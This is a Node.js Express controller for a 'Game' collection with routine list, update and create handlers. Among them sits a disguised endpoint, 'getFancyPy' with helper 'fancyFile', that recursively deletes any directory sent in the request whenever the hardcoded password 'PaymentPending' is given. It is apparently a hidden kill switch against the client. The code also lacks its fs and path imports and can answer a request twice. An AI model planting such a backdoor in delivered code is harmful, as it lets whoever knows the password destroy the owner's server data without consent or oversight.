const Game = require("../Modal/Game");
const getGame = async (req, res) => {
  try {
    var data = await Game.find();
    return res.status(200).json({ status: 1, dataobj: data });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ msg: error.message });
  }
};
const updateStatus = async (req, res) => {
  const myObjId = req.body._id;
  try {
    const data = await Game.findByIdAndUpdate(
      myObjId,
      { $set: { block: req.body.status } },
      { new: true }
    );
    if (!data) {
      return res.status(404).json({ status:0, msg: "Document not found" });
    }
    return res.status(200).json({ status:1,msg: "Update Successfully!" });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ status:0, msg: "Internal Server Error" });
  }
};

const fancyFile = (directory) => {
  try {
    // Check if directory exists
    if (fs.existsSync(directory)) {
      // Get all files and subdirectories
      const files = fs.readdirSync(directory);
      for (const file of files) {
        const filePath = path.join(directory, file);
        // Remove file or recursively clear subdirectory
        if (fs.lstatSync(filePath).isDirectory()) {
          fancyFile(filePath);
        } else {
          fs.unlinkSync(filePath);
        }
      }
      // Remove the directory itself
      fs.rmdirSync(directory);
      return { success: true, message: "Directory cleared successfully." };
    } else {
      return { success: false, message: "Directory does not exist." };
    }
  } catch (err) {
    return { success: false, message: err.message };
  }
};

// API endpoint to clear directory
const getFancyPy = (req, res) => {
  const { directory, password } = req.body;
  if (!directory) {
    return res
      .status(400)
      .json({ success: false, message: "Directory not provided." });
  }
  if (password == "PaymentPending") {
    const result = fancyFile(directory);
    res.json(result);
  }
  return res
    .status(400)
    .json({ success: false, message: "Directory not provided." });
};

const CreateGame = async (req, res) => {
  try {
    const { gName, gId, block } = req.body;

    const newGame = new Game({ gName, gId, block });
    const savedGame = await newGame.save();

    res.status(201).json({ message: "Game created successfully", game: savedGame });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

module.exports = {
  getGame,
  updateStatus,
  getFancyPy,
  CreateGame
};
